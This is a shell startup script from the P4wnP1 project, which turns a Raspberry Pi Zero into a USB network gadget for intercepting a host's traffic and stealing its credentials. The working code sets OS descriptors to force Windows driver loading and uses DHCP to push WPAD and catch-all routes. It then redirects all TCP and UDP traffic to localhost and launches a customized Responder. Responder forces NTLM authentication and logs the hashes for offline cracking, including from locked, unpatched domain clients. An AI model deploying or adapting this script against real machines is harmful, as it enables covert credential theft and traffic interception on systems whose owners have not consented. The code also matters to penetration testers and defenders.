#!/bin/sh
#
# P4wnP1 (PiZero IPv4 traffic interceptor and USB hash stealer)
# startup script
# 	Author:	Marcus Mengs (MaMe82)
#
# Notes:
# 	- setup_p4wnp1.sh should be ran before using this script
#	- the script is meant to run after interactive login (not init), but with root privileges (sudo)
#	  although this increases boot time, this is needed to be able to abort link detection
#	- refer to comments for "inner workings"
#	- work in progress (contains possible errors and typos)
#	- if the device isn't detected changing the USB port (USB 2.0 prefered) or plug out and in
#	  again could help
#	- ssh service should be running, so your're able to connect with
#		$ ssh pi@172.16.0.1
#
#
# ToDo:
#	- add and test HID fuction (first keyboard only)
#	- add manual system date adjusment, to not mess up logs due to missing NTP (store datetime of last boot)
#	- devide the script into multiple stages, to run link detection on seperate thread
#	  this again allows moving the script to an init service to shorten boot time
#	- after implementing multiple stages, add in LED support to highlight which stage currently is ran
#	  by  P4wnP1
#	- add shutdown capability to script, to allow file system syncing before power loss
#	- move files only needed at runtime to /tmp to avoid manual deletion (f.e. DHCP leases)
#	- check for hosts supporting both, RNDIS and CDC ECM, to use ECM in favor
#	- extract "setup" varibles into an external configuration file
#	- check for needed privileges before running the script


# To force Windows to detect a Cmomposite Gadget (RNDIS+HID), several conditions have to be met:
#	- only one device configuration (we use a second for ecm)
#	- class / subclass / proto have to be set to 0x00 / 0x00 / 0x00 (to enumerate device classes
#	per interface, we need class 0x03 for HID and 0x02 for RNDIS)
#	- alternatively  class/subclass/proto could be set to EF/02/01 for Composite Device
#	- in order to avoid that windows detects the RNDIS device as searial com port, we have to add in custom
#	OS descriptors with compat_id=RNDIS and sub_compat_id=5162001

# =======================
# Configuration options
# =======================

# We choose an IP with a very small subnet (see comments in README.rst)
IF_IP="172.16.0.1"
IF_MASK="255.255.255.252"
IF_DHCP_RANGE="172.16.0.2,172.16.0.3"

# 120 attempts with 500ms delay to try to get link on either RNDIS or CDC ECM
# If the Pi is booted stand alone and the script runs after user login (e.g. inserted into .profile)
# the loop could be aborted with <CTRL> + <C>. If the script is integrated into an init.d script
# it isn't possible to interrupt the loop, which runs for 60 seconds till boot continues. In this case
# RETRY_COUNT_LINK_DETECTION could be reduced, with the disadvantage of the host having less time to initialize
# drivers. If the target hasn't enough time to install drivers, this value should be raised.
RETRY_COUNT_LINK_DETECTION=120

# ====================
# USB Init
# ====================

echo "Initializing Ethernet over USB..."
GADGETS_DIR="mame82gadget"

# configure USB gadget to provide (RNDIS like) ethernet interface
# see http://isticktoit.net/?p=1383
# ----------------------------------------------------------------

cd /sys/kernel/config/usb_gadget
mkdir -p $GADGETS_DIR
cd $GADGETS_DIR

# configure gadget details
# =========================
# set Vendor ID to "Linux Foundation"
echo 0xc1cb > idVendor # RNDIS
# set Product ID to "Multifunction Composite Gadget"
echo 0xbaa2 > idProduct # RNDIS
# set device version 1.0.0
echo 0x0100 > bcdDevice
# set USB mode to USB 2.0
echo 0x0200 > bcdUSB


# composite class / subclass / proto (needs single configuration)
echo 0xEF > bDeviceClass
echo 0x02 > bDeviceSubClass
echo 0x01 > bDeviceProtocol

# set device descriptions
mkdir -p strings/0x409 # English language strings
# set serial
echo "deadbeefdeadbeef" > strings/0x409/serialnumber
# set manufacturer
echo "MaMe82" > strings/0x409/manufacturer
# set product
echo "P4wnP1 by MaMe82" > strings/0x409/product

# create configuration instance (for RNDIS, ECM and HDI in a SINGLE CONFIGURATION to support Windows composite device enumeration)
# ================================================================================================================================
mkdir -p configs/c.1/strings/0x409
echo "Config 1: RNDIS network" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower
#echo 0xC0 > configs/c.1/bmAttributes # self powered device
echo 0x80 > configs/c.1/bmAttributes #  USB_OTG_SRP | USB_OTG_HNP

# create RNDIS function
# =======================================================
mkdir -p functions/rndis.usb0
# set up mac address of remote device
echo "42:63:65:13:34:56" > functions/rndis.usb0/host_addr
# set up local mac address 
echo "42:63:65:66:43:21" > functions/rndis.usb0/dev_addr


# create CDC ECM function
# =======================================================
mkdir -p functions/ecm.usb1
# set up mac address of remote device
echo "42:63:65:12:34:56" > functions/ecm.usb1/host_addr
# set up local mac address 
echo "42:63:65:65:43:21" > functions/ecm.usb1/dev_addr


# create HID function
# =======================================================
mkdir -p functions/hid.g1
echo 1 > functions/hid.g1/protocol
echo 1 > functions/hid.g1/subclass
echo 8 > functions/hid.g1/report_length
cat /home/pi/report_desc > functions/hid.g1/report_desc



# add OS specific device descriptors to force Windows to load RNDIS drivers
# =============================================================================
# Witout this additional descriptors, most Windows system detect the RNDIS interface as "Serial COM port"
# To prevent this, the Microsoft specific OS descriptors are added in here
# !! Important:
#	If the device already has been connected to the Windows System without providing the
#	OS descriptor, Windows never asks again for them and thus never installs the RNDIS driver
#	This behavior is driven by creation of an registry hive, the first time a device without 
#	OS descriptors is attached. The key is build like this:
#
#	HKLM\SYSTEM\CurrentControlSet\Control\usbflags\[USB_VID+USB_PID+bcdRelease\osvc
#
#	To allow Windows to read the OS descriptors again, the according registry hive has to be
#	deleted manually or USB descriptor values have to be cahnged (f.e. USB_PID).

mkdir -p os_desc
echo 1 > os_desc/use
echo 0xbc > os_desc/b_vendor_code
echo MSFT100 > os_desc/qw_sign

mkdir -p functions/rndis.usb0/os_desc/interface.rndis
echo RNDIS > functions/rndis.usb0/os_desc/interface.rndis/compatible_id
echo 5162001 > functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id


# bind function instances to respective configuration
# ====================================================
ln -s functions/rndis.usb0 configs/c.1/ # RNDIS on config 1 # RNDIS has to be the first interface on Composite device
ln -s functions/hid.g1 configs/c.1/ # HID on config 1
ln -s functions/ecm.usb1 configs/c.1/ # ECM on config  1
ln -s configs/c.1/ os_desc # add config 1 to OS descriptors


# check for first available UDC driver
UDC_DRIVER=$(ls /sys/class/udc | cut -f1 | head -n 1)
# bind USB gadget to this UDC driver
echo $UDC_DRIVER > UDC

# =================================
# Network init
# =================================

# bring up both interfaces to check for physical link
ifconfig usb0 up
ifconfig usb1 up

# Waiting for one of the interfaces to get a link (either RNDIS or ECM)
#    loop count is limited by $RETRY_COUNT_LINK_DETECTION, to continue execution if this is used 
#    as blocking boot script
#    note: if the loop count is too low, windows may not have enough time to install drivers

# ToDo: check if operstate could be used for this, without waiting for carrieer
device="none"
count=0
while [[ $count -lt $RETRY_COUNT_LINK_DETECTION ]]; do
	echo "Check $count of $RETRY_COUNT_LINK_DETECTION"
	echo "========================="
	echo "Operstate usb0 $(cat /sys/class/net/usb0/operstate)"
	echo "Operstate usb1 $(cat /sys/class/net/usb1/operstate)"

	# check RNDIS for link
	if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
# ToDo: special case: Linux Systems detecting RNDIS should use CDC ECM anyway
		echo "Link detected on usb0"; sleep 2
		device="usb0"
		ifconfig usb1 down

		break
	fi

	# check ECM for link
	if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
		echo "Link detected on usb1"; sleep 2
		device="usb1"
		ifconfig usb0 down

		break
	fi
	sleep 0.5
	let count=count+1
#	echo $device
done

echo "Device selected: $device"

# if here we have link on $device or we hit the retry limit (neither RNDIS nor CDC ECM are connected)
if [ "$device" != "none" ]; then

	# setup interface with correct IP
	ifconfig $device $IF_IP netmask $IF_MASK


	# remove old DHCP leases
	rm /var/lib/misc/dnsmasq.leases 2> /dev/null

	# update dnsmasq DHCP setup
cat << EOF > /home/pi/dnsmasq.conf
port=0
listen-address=$IF_IP
dhcp-range=$IF_DHCP_RANGE,$IF_MASK,5m
dhcp-option=252,http://$IF_IP/wpad.dat

# router
dhcp-option=3,$IF_IP

# DNS
dhcp-option=6,$IF_IP

# NETBIOS NS
dhcp-option=44,$IF_IP
dhcp-option=45,$IF_IP

# routes static (route 0.0.0.1 to 127.255.255.254 through our device)
dhcp-option=121,0.0.0.0/1,$IF_IP,128.0.0.0/1,$IF_IP
# routes static (route 128.0.0.1 to 255.255.255.254 through our device)
dhcp-option=249,0.0.0.0/1,$IF_IP,128.0.0.0/1,$IF_IP

dhcp-leasefile=/var/lib/misc/dnsmasq.leases
dhcp-authoritative
log-dhcp
EOF
	# Enabeling of IPv4 kernel routing isn't needed to acces packets on the nat chain, thus we leave it turned off
	#echo 1 > /proc/sys/net/ipv4/ip_forwarding

	# example rule to redirect TCP port 80 to a custom service on 127.0.0.1:8080 instead of Responder's webserver
	#	usage examples in case you're getting out of ideas: mitmproxy, metasploit, sslsplit, PoisonTap nodejs app...
	#iptables -t nat -A PREROUTING -i $device -p tcp --dport 80 -j REDIRECT --to-port 8080

	# redirect all traffic meant to be routed out through the Raspberry to localhost (127.0.0.1)
	# 	this for example fetches traffic to DNS servers, which aren't overwritten by our DHCP lease
	#	an UDP request to 8.8.4.4:53 from our target would end up here on 127.0.0.1:53, thanks to
	#	the static routes for 0.0.0.0/1 and 128.0.0.0/1
	iptables -t nat -A PREROUTING -i $device -p tcp -m addrtype ! --dst-type BROADCAST,LOCAL -j REDIRECT
	iptables -t nat -A PREROUTING -i $device -p udp -m addrtype ! --dst-type BROADCAST,LOCAL -j REDIRECT


	# start DHCP server (listening on IF_IP)
	dnsmasq -C /home/pi/dnsmasq.conf

# ========================================
# Attack target through established Network
# (all nifty ideas should be deployed here
# ========================================


	# Example setup
	# -----------------
	#
	# The customized Responder (https://github.com/mame82/Responder, branch: EMULATE_INTERNET_AND_WPAD_ANYWAY) 
	# runs the following setup:
	#	1) DNS, LLMNR and NBT-NS enabled: As all packets arrive here, every possible hostname resolves to 172.16.0.1
	#	no matter which name resolution technique is used by the target. This could be tested from the target by running:
	#		$ ping <somerandomhostname>
	#	2) Fingerprinting (OS discovery is enabled)
	#	3) HTTP requests to any IP / hostname / domainname are redirected to Responder and served with a custom
	#	HTML page (/home/pi/Responder/filles/AccessDenied.html). This file contains an invisible image referencing
	#	a SMB share at \\spoofsmb\.
	#	4) SMB requests (including the one to SPOOFSMB) are redirected to Responder and the client is forced to 
	#	authenticate to a random challenge. NTLM hash of the user gets logged along with the provided challenge for offline
	#	cracking in /home/pi/Responder/logs and /home/pi/Responder/Responder.db
	#	5) Requests to wpad.dat are answered with a forced NTLM authentication (customized Responder needed to do this
	#	while serving HTTP files). Such an request is issued everytime the host connects, because the WPAD server is
	#	provided via DHCP. Windows Domain Clients without MS16-112 patch send the NTLM hash, even if the screen is locked.
	#	This is basically the attack presented by Mubix.
	#	6) Connectivity tests of Windows 7 and Windows 10 clients are answered correctly, thus the OS believes an Internet
	#	connection is present on the interface (customized Responder needed to do this)
	#	7) All other responder servers IMAP/POP3/FTP ... are running, too
	# 	8) Responder runs in a screen session, thus the output could be attached to a SSH session on the Pi:
	#		$ ssh pi@172.16.0.1
	#		$ sudo screen -d -r
	screen -dmS responder bash -c "cd /home/pi/Responder/; python Responder.py -I $device -f -v -w -F"


else
	# device is None (thus neither RNDIS nor CDC ECM is running)
	echo "Disabling devices again, because neither has link"
	ifconfig usb0 down
	ifconfig usb1 down
	sleep 1
fi
